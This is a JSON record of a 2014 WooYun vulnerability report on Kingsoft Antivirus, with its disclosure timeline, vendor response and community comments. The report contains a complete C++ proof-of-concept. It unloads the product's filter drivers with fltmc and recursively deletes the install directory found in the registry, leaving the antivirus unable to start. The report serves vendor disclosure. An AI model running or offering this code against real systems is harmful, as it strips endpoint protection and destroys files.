{"id": 4163, "wybug_id": "wooyun-2014-051363", "wybug_title": "编写ring3程序攻破金山毒霸硬盘保护", "wybug_corp": "金山毒霸", "wybug_author": "听曲人", "wybug_date": "2014-02-19 11:15", "wybug_open_date": "2014-05-20 11:16", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "防御突破"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向公众公开  简要描述： 系统环境：win7 64bit采用在金山官网上最新下载的新毒霸（悟空）运行详细说明中的程序，即可攻破硬盘保护，另有附赠功能：直接删除金山安装目录下的若干配置文件，导致金山毒霸下次开机不能启动。此漏洞是由金山毒霸自我保护机制的缺陷所导致，（驱动缺陷）同样原理下，能做哪些事，大家都懂得！希望金山能好好照顾您的毒霸，尽快修复漏洞= =! 详细说明：  您对您的filter驱动（KNBDrv，kisknl）根本没有保护……该代码跑一边肯定废掉KNBDrv，kisknl，有时要跑两边才能废掉kingsoft antivirus目录下的文件，达到毒霸不能重启的效果记得用管理员权限跑哦\n#include \"stdafx.h\"#include <windows.h>#define CMD_PREFIX _T(\"rd /s /q \")#define CMD_PREFIX_SIZE sizeof(CMD_PREFIX)//雕虫小技，诸君见笑了int _tmain(int argc, _TCHAR* argv[]){\t_tsystem(_T(\"fltmc unload KNBDrv\"));\t_tsystem(_T(\"fltmc unload kisknl\"));\tHKEY hKey;\tchar szValue[MAX_PATH];\tDWORD dwType;\tDWORD dwLength;\tRegOpenKey(HKEY_LOCAL_MACHINE, _T(\"SOFTWARE\\\\Kingsoft\\\\antivirus\"), &hKey);\tRegQueryValueEx(hKey,\t\t_T(\"ProgramPath\"),\t\tNULL,\t\t&dwType,\t\t(LPBYTE)szValue,\t\t&dwLength);\tTCHAR strCmd[MAX_PATH + CMD_PREFIX_SIZE];\twsprintf(strCmd, _T(\"%s\\\"%s\\\"\"), CMD_PREFIX, szValue);\t_tsystem(strCmd);\t_tsystem(_T(\"pause\"));\treturn 0;}\n   漏洞证明：  \n\n如需进一步信息，包括并不限于整个工程文件、更具体的系统环境、请我吃饭、讨论明清史等等，邮件发至littlebluepuppy@163.com   修复方案：  对您的驱动给予保护，对漏洞的上报者给予奖励   版权声明：转载请注明来源 听曲人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-02-19 16:10 厂商回复： 感谢您的反馈。综合判断漏洞的利用场景与复杂度、以及影响。总和评估为中危。我们将尽快跟进。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-19 11:19 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  希望金山能好好照顾您的毒霸，尽快修复漏洞= =!    \n     2014-02-19 11:20 |    \t\t川川 \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:28        | 今天我刷屏)\t\t \n  神奇的路人甲，膜拜高手，不知收小弟不？    \n     2014-02-19 11:47 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  高手呀！    \n     2014-05-07 08:35 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  金山公司骨灰级粉丝 关注此漏洞研究下    \n     2014-05-20 11:52 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  直接删文件？    \n     2014-05-20 15:09 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  对漏洞的上报者给予奖励。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}